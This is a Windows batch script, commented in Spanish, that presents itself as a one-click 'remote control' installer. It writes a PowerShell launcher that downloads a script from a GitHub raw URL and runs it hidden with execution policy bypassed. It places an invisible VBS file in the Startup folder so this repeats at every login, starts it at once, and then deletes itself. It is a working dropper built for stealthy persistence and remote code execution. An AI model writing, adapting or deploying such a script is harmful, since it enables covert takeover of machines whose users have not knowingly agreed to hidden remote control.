@echo off
title Instalador Fijo de Un Solo Clic
color 0B

echo ===================================================
echo     INSTALADOR AUTOMATICO DE CONTROL REMOTO
echo ===================================================
echo.
echo Descargando y configurando el sistema, espere...

:: 1. CONFIGURACIÓN: REEMPLAZA abajo con tu enlace RAW exacto de GitHub
set "URL_GITHUB=https://raw.githubusercontent.com/joe2sc712-beep/control-remoto/refs/heads/main/cliente_base.ps1"

:: Definicion de rutas fijas de Windows
set "CARPETA_C=C:\ScriptCliente"
set "LANZADOR_PS1=%CARPETA_C%\cliente.ps1"
set "STARTUP_VBS=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\iniciar_cliente.vbs"

:: 2. CREAR CARPETA EN C:\ SI NO EXISTE
if not exist "%CARPETA_C%" mkdir "%CARPETA_C%"

:: 3. CREAR EL ARCHIVO LANZADOR (cliente.ps1) DENTRO DE C:\ScriptCliente\
:: Usamos caracteres de escape individuales para que CMD no se confunda
echo Componiendo lanzador de actualizaciones...
echo $UrlGitHub  = "%URL_GITHUB%" > "%LANZADOR_PS1%"
echo $RutaLocal  = "$PSScriptRoot\cliente_base.ps1" >> "%LANZADOR_PS1%"
echo try { >> "%LANZADOR_PS1%"
echo     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 >> "%LANZADOR_PS1%"
echo     Invoke-WebRequest -Uri $UrlGitHub -OutFile $RutaLocal -TimeoutSec 10 -ErrorAction Stop >> "%LANZADOR_PS1%"
echo } catch {} >> "%LANZADOR_PS1%"
echo if (Test-Path $RutaLocal) { >> "%LANZADOR_PS1%"
echo     powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $RutaLocal >> "%LANZADOR_PS1%"
echo } >> "%LANZADOR_PS1%"

:: 4. CREAR EL ARCHIVO INVISIBLE VBS EN LA CARPETA DE INICIO (Startup)
echo Componiendo acceso invisible de inicio...
echo Set WshShell = CreateObject("WScript.Shell") > "%STARTUP_VBS%"
echo RutaLanzador = "C:\ScriptCliente\cliente.ps1" >> "%STARTUP_VBS%"
echo WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ ^& RutaLanzador ^& """", 0, False >> "%STARTUP_VBS%"

echo.
echo [+] INSTALACION COMPLETADA CON EXITO.
echo [+] El servicio ya esta corriendo de forma invisible.
echo.

:: 5. PASO FINAL: INICIAR EL SISTEMA AHORA MISMO
if exist "%STARTUP_VBS%" wscript.exe "%STARTUP_VBS%"

timeout /t 3 >nul

del "%~f0"

exit
